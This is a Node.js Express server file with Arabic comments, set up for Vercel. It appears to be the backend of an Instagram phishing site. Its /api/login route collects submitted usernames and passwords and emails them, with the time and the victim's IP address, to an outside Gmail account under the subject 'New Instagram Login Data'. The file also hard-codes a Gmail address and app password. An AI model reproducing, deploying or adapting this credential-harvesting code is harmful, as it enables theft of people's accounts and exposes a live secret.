const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
// لا نحتاج PORT هنا لأن Vercel ستديره
// const PORT = process.env.PORT || 3000;

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'nlvx.v7@gmail.com',     // إيميلك
    pass: 'lsnq yini wfbl ctkr'          // App Password الخاص بك
  }
});

// Root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ 
      success: false, 
      message: 'البيانات ناقصة' 
    });
  }

  const mailOptions = {
    from: '"Instagram Login" <nlvx.v7@gmail.com>',
    to: 'nlvxvxx@gmail.com',
    subject: 'New Instagram Login Data',
    html: `
      <h2>New Instagram Login Attempt</h2>
      <p><strong>Username:</strong> ${username}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
      <p><strong>IP:</strong> ${req.ip || req.connection.remoteAddress}</p>
    `
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Email error:', error);
      return res.status(500).json({ 
        success: false, 
        message: 'فشل إرسال البريد' 
      });
    }
    console.log('Email sent:', info.response);
    res.status(200).json({ 
      success: true, 
      message: 'تم الإرسال بنجاح' 
    });
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ 
    success: false, 
    message: 'حدث خطأ في الخادم' 
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ 
    success: false, 
    message: 'الصفحة غير موجودة' 
  });
});

// === التغييرات هنا ===

// 1. تم حذف هذا السطر أو تحويله لتعليق
/*
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the app at: http://localhost:${PORT}` );
});
*/

// 2. تمت إضافة هذا السطر لتصدير التطبيق لـ Vercel
module.exports = app;
